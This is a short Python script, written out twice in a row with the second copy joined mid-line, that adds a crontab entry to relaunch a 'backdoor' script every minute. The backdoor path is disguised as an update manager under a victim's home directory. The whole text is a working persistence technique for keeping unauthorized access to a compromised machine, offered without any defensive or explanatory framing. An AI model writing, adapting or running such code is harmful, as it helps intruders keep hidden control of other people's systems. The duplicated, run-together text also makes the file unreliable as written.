import os

# Path to your Python backdoor script
backdoor_script = "/home/victim/.config/update_manager.py"

# Add a cron job to run the backdoor every minute
os.system(f"(crontab -l 2>/dev/null; echo '* * * * * python3 {backdoor_script}') | crontab -")

print("[+] Cron job added! Backdoor will respawn every 60 seconds.")import os

# Path to your Python backdoor script
backdoor_script = "/home/victim/.config/update_manager.py"

# Add a cron job to run the backdoor every minute
os.system(f"(crontab -l 2>/dev/null; echo '* * * * * python3 {backdoor_script}') | crontab -")

print("[+] Cron job added! Backdoor will respawn every 60 seconds.")